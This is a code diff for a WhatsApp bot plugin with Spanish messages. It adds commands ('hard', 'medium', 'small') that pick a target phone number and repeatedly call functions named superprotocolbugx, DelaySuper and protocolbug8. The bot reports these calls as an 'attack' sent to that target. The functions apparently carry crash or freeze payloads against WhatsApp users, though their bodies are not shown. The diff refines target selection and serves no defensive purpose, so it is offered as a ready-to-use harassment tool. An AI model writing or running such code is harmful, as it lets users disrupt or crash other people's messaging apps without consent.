@@ -66,16 +66,45 @@ if (mention) {
 
 } }
 
-// 🧨 COMANDO
- let handler = async (m, { conn, text, command }) => { if (!text) return m.reply(❌ Debes poner el número objetivo.\nEjemplo: .${command} 521234567890);
+let handler = async (m, { conn, text, command }) => {
+  global.client = conn;
 
-const target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'; global.client = conn;
+  // Detectar el número objetivo
+  let target;
+  if (m.quoted) {
+    target = m.quoted.sender;
+  } else if (text) {
+    target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+  } else {
+    target = m.sender; // Usa el número del que envía el comando
+  }
 
-await conn.sendMessage(m.chat, { text: 🔥 Ataque tipo *${command.toUpperCase()}* enviado a:\n✦ *${target}*\nEspere unos segundos..., mentions: [m.sender] }, { quoted: m });
+  if (!target.includes('@s.whatsapp.net')) {
+    return m.reply(`❌ No se pudo determinar el objetivo.\nUsa el comando así:\n• .${command} 521xxxx\n• o responde a un mensaje\n• o usa en privado`);
+  }
 
-for (let i = 0; i < 3; i++) { await superprotocolbugx(target, true); await superprotocolbugx(target, true); await superprotocolbugx(target, true); await DelaySuper(target, true); await DelaySuper(target, true); await DelaySuper(target, true); await protocolbug8(target, true); await protocolbug8(target, true); await protocolbug8(target, true); }
+  await conn.sendMessage(m.chat, {
+    text: `🔥 Ataque tipo *${command.toUpperCase()}* enviado a:\n✦ *${target}*\nEspere unos segundos...`,
+    mentions: [m.sender]
+  }, { quoted: m });
 
-await conn.sendMessage(m.chat, { text: ✅ Ataque *${command}* completado.\nObjetivo: *${target}*, mentions: [m.sender] }, { quoted: m }); };
+  for (let i = 0; i < 3; i++) {
+    await superprotocolbugx(target, true);
+    await superprotocolbugx(target, true);
+    await superprotocolbugx(target, true);
+    await DelaySuper(target, true);
+    await DelaySuper(target, true);
+    await DelaySuper(target, true);
+    await protocolbug8(target, true);
+    await protocolbug8(target, true);
+    await protocolbug8(target, true);
+  }
+
+  await conn.sendMessage(m.chat, {
+    text: `✅ Ataque *${command}* completado.\nObjetivo: *${target}*`,
+    mentions: [m.sender]
+  }, { quoted: m });
+};
 
 handler.command = ['hard', 'medium', 'small']; handler.group = false; handler.premium = false; handler.register = false; handler.limit = false;
 
